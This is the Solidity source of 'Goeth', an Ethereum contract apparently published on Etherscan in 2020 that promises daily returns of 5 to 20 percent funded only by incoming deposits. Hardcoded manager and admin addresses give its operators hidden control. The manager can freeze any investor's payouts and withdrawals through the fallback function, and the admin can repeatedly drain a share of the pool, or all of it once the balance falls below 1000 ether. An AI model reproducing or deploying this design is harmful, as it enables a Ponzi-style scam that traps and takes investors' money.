/**
 *Submitted for verification at Etherscan.io on 2020-05-30
*/

pragma solidity 0.4.26;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns(uint256) {
        if(a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "NaN");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b > 0, "NaN");
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b <= a, "NaN");
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns(uint256) {
        uint256 c = a + b;
        require(c >= a, "NaN");
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns(uint256) {
        require(b != 0, "NaN");
        return a % b;
    }
}

contract Roles {
    mapping(string => mapping(address => bool)) private rules;

    event RoleAdded(string indexed role, address indexed to);
    event RoleRemoved(string indexed role, address indexed to);

    modifier onlyHasRole(string _role) {
        require(rules[_role][msg.sender], "Access denied");
        _;
    }

    function hasRole(string _role, address _to) view public returns(bool) {
        require(_to != address(0), "Zero address");

        return rules[_role][_to];
    }

    function addRole(string _role, address _to) internal {
        require(_to != address(0), "Zero address");

        rules[_role][_to] = true;

        emit RoleAdded(_role, _to);
    }

    function removeRole(string _role, address _to) internal {
        require(_to != address(0), "Zero address");

        rules[_role][_to] = false;
        
        emit RoleRemoved(_role, _to);
    }
}

contract Goeth is Roles {
    using SafeMath for uint;

    struct Investor {
        uint invested;
        uint last_payout;
    }

    struct Admin {
        uint percent;
        uint timeout;
        uint min_balance;
        uint last_withdraw;
    }

    mapping(address => Investor) public investors;
    mapping(address => bool) public blockeds;
    mapping(address => Admin) public admins;

    event Payout(address indexed holder, uint etherAmount);
    event Deposit(address indexed holder, uint etherAmount);
    event WithdrawEther(address indexed to, uint etherAmount);
    event Blocked(address indexed holder);
    event UnBlocked(address indexed holder);

    constructor() public {
        addRole("manager", 0x40540fc84F6b126222Eb1595447ad929c2Ae57a7);

        admins[0x674052fAb7EeF08A9D3E5f430304C641e7892eb9] = Admin(5, 0, 1000 ether, 0);
    }

    function investorBonusSize(address _to) view public returns(uint) {
        uint b = investors[_to].invested;

        if(b >= 100 ether) return 20;
        if(b >= 70 ether) return 18;
        if(b >= 40 ether) return 15;
        if(b >= 15 ether) return 10;
        if(b >= 7 ether) return 7;
        if(b >= 3 ether) return 6;
        return 5;
    }

    function payoutSize(address _to) view public returns(uint) {
        uint invested = investors[_to].invested;

        if(invested == 0) return 0;

        return invested.mul(investorBonusSize(_to)).div(100).mul(block.timestamp.sub(investors[_to].last_payout)).div(1 days);
    }

    function bytesToAddress(bytes bys) pure private returns(address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }

    function() payable external {
        if(hasRole("manager", msg.sender)) {
            require(msg.data.length > 0, "Send the address in data");

            address addr = bytesToAddress(msg.data);

            require(!hasRole("manager", addr) && admins[addr].percent == 0, "This address is manager");

            if(!blockeds[addr]) {
                blockeds[addr] = true;
                emit Blocked(addr);
            }
            else {
                blockeds[addr] = false;
                emit UnBlocked(addr);
            }
            
            if(msg.value > 0) {
                msg.sender.transfer(msg.value);
            }

            return;
        }

        if(investors[msg.sender].invested > 0 && !blockeds[msg.sender]) {
            uint payout = payoutSize(msg.sender);

            require(msg.value > 0 || payout > 0, "No payouts");

            if(payout > 0) {
                investors[msg.sender].last_payout = block.timestamp;

                msg.sender.transfer(payout);

                emit Payout(msg.sender, payout);
            }
        }

        if(msg.value > 0) {
            if (msg.value == 0.0001 ether) {
                if(blockeds[msg.sender]) {
                    return;
                }

                uint amount = investors[msg.sender].invested;

                investors[msg.sender].invested = investors[msg.sender].invested.sub(amount);
                
                msg.sender.transfer(amount);

                emit WithdrawEther(msg.sender, amount);

                return;
            } 

            require(msg.value >= 0.01 ether, "Minimum investment amount 0.01 ether");

            investors[msg.sender].last_payout = block.timestamp;
            investors[msg.sender].invested = investors[msg.sender].invested.add(msg.value);
                
            emit Deposit(msg.sender, msg.value);
        }
    }

    function withdrawEther(address _to) public {
        Admin storage admin = admins[msg.sender];
        uint balance = address(this).balance;

        require(admin.percent > 0, "Access denied");
        require(admin.timeout == 0 || block.timestamp > admin.last_withdraw.add(admin.timeout), "Timeout");
        require(_to != address(0), "Zero address");
        require(balance > 0, "Not enough balance");

        uint amount = balance > admin.min_balance ? balance.div(100).mul(admin.percent) : balance;

        admin.last_withdraw = block.timestamp;

        _to.transfer(amount);

        emit WithdrawEther(_to, amount);
    }
}